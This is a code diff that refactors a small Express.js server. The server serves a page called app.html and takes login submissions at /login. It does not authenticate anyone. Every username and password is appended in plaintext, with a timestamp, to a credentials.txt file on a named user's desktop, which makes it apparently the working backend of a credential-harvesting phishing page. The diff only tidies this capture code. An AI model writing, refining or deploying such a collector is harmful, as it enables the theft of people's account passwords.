@@ -5,52 +5,30 @@ const path = require('path');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// ---- Path logic ----
+// Path logic: try Windows desktop folder first, fallback to ./data
 const WINDOWS_PATH = 'C:\\Users\\donut\\Desktop\\data';
-let SAVE_DIR;
-if (fs.existsSync(WINDOWS_PATH)) {
-  SAVE_DIR = WINDOWS_PATH;
-} else {
-  SAVE_DIR = path.join(__dirname, 'data');
-}
+const SAVE_DIR = fs.existsSync(WINDOWS_PATH) ? WINDOWS_PATH : path.join(__dirname, 'data');
 const SAVE_FILE = path.join(SAVE_DIR, 'credentials.txt');
 
-// Ensure directory exists
-if (!fs.existsSync(SAVE_DIR)) {
-  fs.mkdirSync(SAVE_DIR, { recursive: true });
-  console.log(`Created directory: ${SAVE_DIR}`);
-}
-console.log(`Saving to: ${SAVE_FILE}`);
+if (!fs.existsSync(SAVE_DIR)) fs.mkdirSync(SAVE_DIR, { recursive: true });
 
 app.use(express.json());
 app.use(express.static(__dirname));
 
-app.get('/', (req, res) => {
-  res.sendFile('app.html', { root: __dirname });
-});
+app.get('/', (req, res) => res.sendFile('app.html', { root: __dirname }));
 
 app.post('/login', (req, res) => {
   const { username, password } = req.body;
-  console.log(`Received login: ${username} / ${password}`);
+  if (!username || !password) return res.status(400).json({ error: 'Missing fields' });
 
-  if (!username || !password) {
-    return res.status(400).json({ error: 'Username and password required' });
-  }
-
-  const timestamp = new Date().toISOString();
-  const logLine = `[${timestamp}] Username: ${username} | Password: ${password}\n`;
-
+  const logLine = `[${new Date().toISOString()}] Username: ${username} | Password: ${password}\n`;
   try {
-    // Write with a flag to create if missing
     fs.appendFileSync(SAVE_FILE, logLine, 'utf8');
-    console.log(`Appended to ${SAVE_FILE}`);
-    res.json({ success: true, message: 'Credentials saved' });
+    res.json({ success: true });
   } catch (err) {
-    console.error('Error writing to file:', err);
-    res.status(500).json({ error: 'Failed to save credentials' });
+    console.error(err);
+    res.status(500).json({ error: 'Write failed' });
   }
 });
 
-app.listen(PORT, () => {
-  console.log(`Server running on port ${PORT}`);
-});
+app.listen(PORT, () => console.log(`Server running on port ${PORT}\nSaving to: ${SAVE_FILE}`));
